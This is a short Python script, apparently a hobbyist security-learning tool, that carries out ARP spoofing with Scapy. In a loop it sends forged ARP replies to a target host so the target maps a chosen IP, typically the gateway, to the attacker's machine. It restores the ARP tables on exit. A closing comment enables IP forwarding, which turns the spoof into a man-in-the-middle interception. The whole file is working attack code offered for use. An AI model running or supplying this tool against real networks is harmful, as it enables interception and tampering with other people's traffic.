#!/usr/bin/env python

from scapy.all import *
from argparse import ArgumentParser
from time import sleep

def get_args():
    parser = ArgumentParser()
    parser.add_argument("-i", "--interface", dest="t_intf", help="Target interface to spoof")
    parser.add_argument("-t", "--target", dest="target", help="Target IP address")
    parser.add_argument("spoof_ip", help="IP we pretend that we are") 
    args = parser.parse_args()
    
    return args

def get_mac(ip):
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    ans = srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    return ans[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)

    send(packet, count=4, verbose=False)

args = get_args()

sent_packets_count = 0
interface = args.t_intf 
target = args.target
spoof_ip = args.spoof_ip

try:
    while True:
        spoof(target, spoof_ip)
        sent_packets_count += 1
        print(f"\r\u001b[38;5;122m[+] Sent {sent_packets_count} packets", end="")
        sleep(2)
except KeyboardInterrupt:
    print('\n[-] Ctrl+C, exiting program...Restoring ARP tables, please wait...')
    restore(spoof_ip, target)
    print("\u001b[38;5;202mGetting everything back as it was...🤫")

# echo 1 > /proc/sys/net/ipv4/ip_forward